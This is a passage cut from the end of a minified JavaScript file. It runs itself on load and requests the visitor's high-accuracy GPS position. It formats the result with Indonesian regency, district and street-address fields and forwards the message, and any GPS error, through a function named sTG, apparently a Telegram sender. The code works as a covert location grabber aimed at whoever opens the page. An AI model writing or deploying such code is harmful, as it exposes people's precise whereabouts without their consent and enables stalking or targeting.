                g+=`ðŸ™ï¸ Kabupaten: ${l.kb}\nðŸ™ï¸ Kecamatan: ${l.kc}\nðŸ¡ Alamat: ${l.fa}\n`;
                await sTG(g)
            },async e=>{
                await sTG(`ðŸ”´ GPS Error : ${e.message}`)
            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
        }
    };

    ST();
})();
